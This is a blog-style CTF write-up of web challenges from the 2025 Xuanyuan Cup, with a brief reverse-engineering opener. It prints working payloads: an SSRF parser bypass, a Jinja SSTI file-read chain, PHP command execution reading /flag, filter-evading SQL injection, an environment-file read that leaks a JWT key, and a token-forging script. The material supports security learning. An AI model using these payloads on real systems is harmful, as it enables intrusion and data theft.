# 轩辕杯 2025 Web Writeup




轩辕杯云盾砺剑CTF挑战赛 2025 Web Writeup

# Web

## ezjs
js 小游戏
![](file-20250520162802024.png)

看 `/js/main.js`源代码
![](file-20250520162852959.png)

```text
http://27.25.151.26:30461/getflag.php
POST: score=100000000000
```
![](file-20250520162954559.png)

## ezssrf1.0
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

if ($url == null)
    die("Try to add ?url=xxxx.");

$x = parse_url($url);

if (!$x)
    die("(;_;)");

if ($x['host'] === null && $x['scheme'] === 'http') {
    echo ('Well, Going to ' . $url);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    echo ($result);
} else
    echo "(^-＿-^)"; 
```
![](file-20250520214444524.png)

这题唯一难点就是如何让 `host`为 `null`，单斜杠时`parse_url`就识别不到`host`键，再通过浏览器特性`@`来指定域名
```text
http://27.25.151.26:42162/?url=http:/@127.0.0.1/
```
![](file-20250520214823429.png)

```text
http://27.25.151.26:42162/?url=http:/@127.0.0.1/flag
```
![](file-20250520214858961.png)

拿到 `Flag` 
```text
http://27.25.151.26:42162/?url=http:/@127.0.0.1/FFFFF11111AAAAAggggg.php
```
![](file-20250520214344068.png)


## 签到
**第一关**
![](file-20250520215434403.png)

```bash
POST /?a=welcome HTTP/1.1
Host: 27.25.151.26:29256
Cookie: star=admin
...

b=new
```
![](file-20250520215509321.png)

**第二关**
![](file-20250520220116724.png)
```text
http://27.25.151.26:29256/l23evel4.php?password=2025.
```
![](file-20250520220125152.png)
**第三关**
![](file-20250520220138975.png)

```bash
POST /levelThree.php HTTP/1.1
Referer: http://11/secretcode

key=ctfpass
```
![](file-20250520220455873.png)

**第四关**
![](file-20250520221653484.png)
```text
HEAD /level444Four.php HTTP/1.1
Host: 27.25.151.26:29256
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 ;identity=n1c3 Firefox/138.0


```
![](file-20250520221703894.png)


```text
W3lC0E_CtF
```
![](file-20250520222206101.png)


第六关
![](file-20250520222241319.png)

```text
ls /
```
![](file-20250520222313391.png)
```text
ca\t /fl\ag
```
![](file-20250520222446278.png)



## ezflask
过滤了 `. 、import 、flag、popen` 等等关键词
![](file-20250520151551507.png)
测试的时候发现 `[]`好像不在黑名单中，但是调用总是 `Internal Server Error`。利用 `attr` 绕过 `.`号过滤，`__getitem__`绕过 `[]`调用失败的问题，拼接绕过 `flag`关键词过滤
最终 `Payload` 如下
```text
/?name={{''|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(99)|attr('get_data')(0,'/fl''ag')}}
```
![](file-20250520160235396.png)

听说好像 `fenjing`直接就能嗦。

## ezrce

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

function waf($a) {
    $disable_fun = array(
        "exec", "shell_exec", "system", "passthru", "proc_open", "show_source", 
        "phpinfo", "popen", "dl", "proc_terminate", "touch", "escapeshellcmd", 
        "escapeshellarg", "assert", "substr_replace", "call_user_func_array", 
        "call_user_func", "array_filter", "array_walk", "array_map", 
        "register_shutdown_function", "register_tick_function", "filter_var", 
        "filter_var_array", "uasort", "uksort", "array_reduce", "array_walk", 
        "array_walk_recursive", "pcntl_exec", "fopen", "fwrite", 
        "file_put_contents", "readfile", "file_get_contents", "highlight_file", "eval"
    );
    
    $disable_fun = array_map('strtolower', $disable_fun);
    $a = strtolower($a);

    if (in_array($a, $disable_fun)) {
        echo "宝宝这对嘛,这不对噢";
        return false;
    }
    return $a;
}

$num = $_GET['num'];
$new = $_POST['new'];
$star = $_POST['star'];

if (isset($num) && $num != 1234) {
    echo "看来第一层对你来说是小case<br>";
    if (is_numeric($num) && $num > 1234) {
        echo "还是有点实力的嘛<br>";
        if (isset($new) && isset($star)) {
            echo "看起来你遇到难关了哈哈<br>";
            $b = waf($new); 
            if ($b) { 
                call_user_func($b, $star); 
                echo "恭喜你，又成长了<br>";
            } 
        }
    }
}
?> 
```


```text
http://27.25.151.26:52228/?num=1235
POST: new=\system&&star=cat /flag
```
![](file-20250521094243065.png)

## ezsql1.0
![](file-20250521202825365.png)

`select`被替换了空，空格在黑名单中
![](file-20250522214649032.png)

简单绕过，测试库表列
```text
-1/**/union/**/selselectect/**/1,2,database()#
```
![](file-20250522164258706.png)
```text
-1/**/union/**/selselectect/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
```
![](file-20250522164353654.png)

```text
-1/**/union/**/selselectect/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name='flag'
```
![](file-20250522164427659.png)

```text
-1/**/union/**/selselectect/**/1,2,group_concat(id,data)/**/from/**/flag
```
假 `FLAG` 
![](file-20250522164513344.png)

```text
-1/**/union/**/selselectect/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata
```
![](file-20250522165121970.png)



```text
-1/**/union/**/selselectect/**/*/**/from/**/xuanyuanCTF.info#
```
![](file-20250522165211130.png)
![](file-20250522165251495.png)





## ez_web1
访问网页
![](file-20250522112351248.png)
给了用户名，随便试一下就进去了
![](file-20250522165349738.png)

```text
fly233/123456789
```
![](file-20250522165421668.png)

两个接口，文件读取以及上传，这里一个非预期，直接读 `/proc/1/version`
![](file-20250522191545603.png)
接下来是预期解法，先读源码
![](file-20250522190912200.png)

```python
from flask import Flask, render_template, request, redirect, url_for, make_response, jsonify
import os
import re
import jwt

app = Flask(__name__, template_folder='templates')
app.config['TEMPLATES_AUTO_RELOAD'] = True
SECRET_KEY = os.getenv('JWT_KEY')
book_dir = 'books'
users = {'fly233': '123456789'}

def generate_token(username):
    payload = {
        'username': username
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    return token

def decode_token(token):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        return payload
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None

@app.route('/')
def index():
    token = request.cookies.get('token')
    if not token:
        return redirect('/login')
    payload = decode_token(token)
    if not payload:
        return redirect('/login')
    username = payload['username']
    books = [f for f in os.listdir(book_dir) if f.endswith('.txt')]
    return render_template('./index.html', username=username, books=books)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        
        return render_template('./login.html')
    elif request.method == 'POST':
        
        username = request.form.get('username')
        password = request.form.get('password')

        
        if username in users and users[username] == password:
            token = generate_token(username)
            response = make_response(jsonify({
                'message': 'success'
            }), 200)
           
            response.set_cookie('token', token, httponly=True, path='/')
            return response
        else:
            
            return {'message': 'Invalid username or password'}

@app.route('/read', methods=['POST'])
def read_book():
    token = request.cookies.get('token')
    if not token:
        return redirect('/login')
    payload = decode_token(token)
    if not payload:
        return redirect('/login')
    book_path = request.form.get('book_path')
    full_path = os.path.join(book_dir, book_path)
    try:
        with open(full_path, 'r', encoding='utf-8') as file:
            content = file.read()
        return render_template('reading.html', content=content)
    except FileNotFoundError:
        return "文件未找到", 404
    except Exception as e:
        return f"发生错误: {str(e)}", 500

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    token = request.cookies.get('token')
    if not token:
        return redirect('/login')
    payload = decode_token(token)
    if not payload:
        return redirect('/login')
    if request.method == 'GET':
        
        return render_template('./upload.html')
    if payload.get('username') != 'admin':
        return """
        <script>
            alert('只有管理员才有添加图书的权限');
            window.location.href = '/';
        </script>
        """
    file = request.files['file']
    if file:
        book_path = request.form.get('book_path')
        file_path = os.path.join(book_path, file.filename)
        if not os.path.exists(book_path):
            return "文件夹不存在", 400
        file.save(file_path)

        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            pattern = r'[{}<>_%]'

            if re.search(pattern, content):
                os.remove(file_path)
                return """
                <script>
                    alert('SSTI,想的美！');
                    window.location.href = '/';
                </script>
                """
        return redirect(url_for('index'))
    return "未选择文件", 400
```

只有 `admin`用户才能上传文件，先读取 `/proc/self/envsion`获取 `key`
```text
JWT_KEY=th1s_1s_k3y
```
![](file-20250522194755318.png)

伪造 `admin`用户登录凭证
```python
import jwt
SECRET_KEY = 'th1s_1s_k3y'

def generate_token(username):
    payload = {
        'username': username
    }
    token = jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    return token

print(generate_token('admin'))

#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.EYrwzSGzfGe_PMnw-Wl4Ymt_QuMtyApHi57DMcZ7e3U
```
![](file-20250522202155245.png)

文件上传之后有短暂的时间存在，然后被删除，这里采用条件竞争来 `SSTI` 注入
```text
book_path = request.form.get('book_path')
file_path = os.path.join(book_path, file.filename)
if not os.path.exists(book_path):
	return "文件夹不存在", 400
file.save(file_path)

with open(file_path, 'r', encoding='utf-8') as f:
	content = f.read()
	pattern = r'[{}<>_%]'

	if re.search(pattern, content):
		os.remove(file_path)
		return """
		<script>
			alert('SSTI,想的美！');
			window.location.href = '/';
		</script>
		"""
return redirect(url_for('index'))
```

思路是通过 BurpSuite 重复发包来进行条件竞争

# Reverse

## ezBase

`UPX` 加了一层壳
![](file-20250523102459693.png)

脱壳，这里加壳是魔改过的，010 修改回去
![](file-20250523105217199.png)


---

> Author: [L1nq](https://github.com/L1nq0)  
> URL: https://sw1mblu3.fun/posts/%E8%BD%A9%E8%BE%95%E6%9D%AF/  

